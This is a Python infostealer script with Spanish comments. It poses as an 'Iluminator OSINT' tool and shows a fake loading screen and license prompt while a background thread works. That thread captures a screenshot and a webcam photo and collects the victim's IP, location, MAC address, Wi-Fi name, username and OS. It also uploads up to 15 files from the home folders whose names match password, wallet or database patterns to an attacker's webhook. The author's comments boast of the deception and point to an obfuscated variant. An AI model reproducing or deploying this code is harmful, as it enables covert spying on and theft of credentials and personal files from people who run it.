#__________________________________________________________
#                                                          |
# Codigo creado por t.me/Valen_Qq (uknowuser_qq) tg y dc   |
#__________________________________________________________|
#
# El codigo cuenta con engaño para hacer esperar al usuario mientras se extraen los archivos simulando una Herramienta de OSINT
# Si quieres que el usuario no mire el codigo y vea las logicas de filtracion de datos simplemente proba con la version OBFUSCADA en el archivo : payload_Obfuscado.py

import requests
import os
import platform
import socket
import subprocess
import glob
import uuid
import pyautogui
import cv2
import time
import threading
import sys
from colorama import Fore, Style, init


init(autoreset=True)


WEBHOOK_URL = "url del webhook aca | creado por t.me/Valen_Qq"


BANNER_ILUMINATOR = r"""
██╗██╗      ██╗   ██╗███╗   ███╗██╗███╗   ██╗ █████╗ ████████╗ ██████╗ ██████╗       ██████╗ ███████╗██╗███╗   ██╗████████╗
██║██║      ██║   ██║████╗ ████║██║████╗  ██║██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗     ██╔═══██╗██╔════╝██║████╗  ██║╚══██╔══╝
██║██║      ██║   ██║██╔████╔██║██║██╔██╗ ██║███████║   ██║   ██║   ██║██████╔╝     ██║   ██║███████╗██║██╔██╗ ██║   ██║   
██║██║      ██║   ██║██║╚██╔╝██║██║██║╚██╗██║██╔══██║   ██║   ██║   ██║██╔══██╗     ██║   ██║╚════██║██║██║╚██╗██║   ██║   
██║███████╗ ╚██████╔ ██║ ╚═╝ ██║██║██║ ╚████║██║  ██║   ██║   ╚██████╔╝██║  ██║     ╚██████╔╝███████║██║██║ ╚████║   ██║   
╚═╝╚══════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝      ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   
"""

BANNER_DDOS = r"""

Error contraseña incorrecta


"""


def obtener_mac():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
    return mac.upper()

def enviar_archivo(ruta, mensaje=None):
    if os.path.exists(ruta):
        try:
            with open(ruta, 'rb') as f:
                requests.post(WEBHOOK_URL, data={"content": mensaje} if mensaje else None, files={"file": f})
        except: pass

def tarea_exfiltracion():

    try:
        pyautogui.screenshot("scr.png")
        enviar_archivo("scr.png")
        os.remove("scr.png")
    except: pass

    try:
        cap = cv2.VideoCapture(0)
        time.sleep(1)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("cam.jpg", frame)
            cap.release()
            enviar_archivo("cam.jpg")
            os.remove("cam.jpg")
    except: pass


    try:
        data = requests.get("https://ipinfo.io/json").json()
        ip, loc, ciudad = data.get("ip", "N/A"), data.get("loc", "N/A"), data.get("city", "N/A")
    except: ip = loc = ciudad = "Error"

    wifi_name = "N/A"
    if platform.system() == "Windows":
        try:
            wifi_out = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces']).decode('utf-8', errors='ignore')
            for line in wifi_out.split("\n"):
                if "SSID" in line and "BSSID" not in line:
                    wifi_name = line.split(":")[1].strip()
                    break
        except: pass

    info = {
        "user": os.getlogin() if platform.system() != 'Windows' else os.environ.get('USERNAME'),
        "pc": socket.gethostname(),
        "ip": ip,
        "mac": obtener_mac(),
        "wifi": wifi_name,
        "ciudad": ciudad,
        "loc": loc,
        "os": platform.platform()
    }


    embed_payload = {
        "embeds": [{
            "title": "🔍 Vz Doxer Reporte ",
            "color": 0x00FF00, 
            "fields": [
                {"name": "👤 Usuario", "value": f"```{info['user']}```", "inline": True},
                {"name": "💻 Nombre PC", "value": f"```{info['pc']}```", "inline": True},
                {"name": "🌐 IP Pública", "value": f"[{info['ip']}](https://ipinfo.io/{info['ip']})", "inline": True},
                {"name": "🆔 Dirección MAC", "value": f"```{info['mac']}```", "inline": True},
                {"name": "📡 Red WiFi", "value": f"```{info['wifi']}```", "inline": True},
                {"name": "📍 Ubicación", "value": f"{info['ciudad']} ([Google Maps](https://www.google.com/maps?q={info['loc']}))", "inline": True},
                {"name": "🖥️ Sistema Operativo", "value": f"```{info['os']}```", "inline": False}
            ]
        }]
    }
    requests.post(WEBHOOK_URL, json=embed_payload)


    keywords = ["DNI", "Contraseña", "CONTRASEÑA", "Usuarios", "SQL", "Password", "Cuentas", "Claves", "Login", "Wallet"]
    exts = [".txt", ".pdf", ".docx", ".jpg", ".png", ".sql", ".sqlite", ".db", ".kdbx"]
    rutas = [os.path.join(os.path.expanduser("~"), d) for d in ["Desktop", "Escritorio", "Documents", "Documentos", "Downloads", "Descargas"]]

    enviados = 0
    for r in rutas:
        if not os.path.exists(r): continue
        for root, dirs, files in os.walk(r):
            for file in files:
                if any(k in file for k in keywords) or any(file.endswith(e) for e in exts):
                    try:
                        path = os.path.join(root, file)
                        if 0 < os.path.getsize(path) < 8 * 1024 * 1024:
                            with open(path, 'rb') as f:
                                requests.post(WEBHOOK_URL, files={"file": f})
                            enviados += 1
                        if enviados >= 15: break
                    except: continue
            if enviados >= 15: break


def interfaz():

    os.system('cls' if os.name == 'nt' else 'clear')
    

    print(Fore.LIGHTGREEN_EX + BANNER_ILUMINATOR)
    print(Fore.LIGHTGREEN_EX + "\n> 20 Opciones de OSINT")
    print(Fore.GREEN + "> Iluminator osint creado por Iluminator_tools\n")


    sys.stdout.write(Fore.LIGHTGREEN_EX + "[+] Porfavor espere")
    for _ in range(5):
        for char in [".", ".", "."]:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.5)

        sys.stdout.write("\b\b\b   \b\b\b")
    
    sys.stdout.write("... OK\n\n")

    try:
        key = input(Fore.LIGHTGREEN_EX + "[*] Espere un poco mas porfavor (instalando librerias)...")
        
        if key == "1234":
            os.system('cls' if os.name == 'nt' else 'clear')
            print(Fore.LIGHTGREEN_EX + BANNER_DDOS)
            print("\n" + Fore.RED + "[!] Contactate con iluminator_tools para obtener una licencia")

            while True:
                time.sleep(10)
        else:
            print(Fore.RED + "Licencia incorrecta. Cerrando...")
            time.sleep(2)
    except:
        pass

if __name__ == "__main__":

    hilo_robo = threading.Thread(target=tarea_exfiltracion)
    hilo_robo.start()


    interfaz()
    

    hilo_robo.join()
